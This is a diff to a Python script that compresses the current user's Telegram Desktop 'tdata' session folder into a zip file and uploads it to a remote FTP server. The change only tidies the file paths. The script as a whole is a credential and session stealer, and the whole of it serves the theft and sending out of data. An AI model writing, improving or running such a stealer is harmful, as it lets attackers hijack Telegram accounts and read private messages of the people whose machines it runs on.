@@ -2,16 +2,15 @@ import os.path
 from ftplib import FTP
 from zipfile import ZipFile
 
-# Searching path to file
+# Get current user home
 pathusr = os.path.expanduser('~')
-# Checking file
-file_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0'
+# Set tdata folder location
+tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
+tdata_file = tdata_path + '..\\tdata.zip'
 
-found = os.path.exists(file_path)
-
-with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'w') as zipObj:
+with ZipFile(tdata_file, 'w') as zipObj:
     # Iterate over all the files in directory
-    for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'):
+    for folderName, subfolders, filenames in os.walk(tdata_path):
         for filename in filenames:
             try:
                 # create complete filepath of file in directory
@@ -30,6 +29,6 @@ ftp.cwd('/folder where you want to save file on FTP server')
 
 # Sending file on FTP server
 print(ftp.dir())
-fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'rb')
+fp = open(tdata_file, 'rb')
 ftp.storbinary('STOR %s' % os.path.basename("tdata.zip"), fp, 1024)
 fp.close()
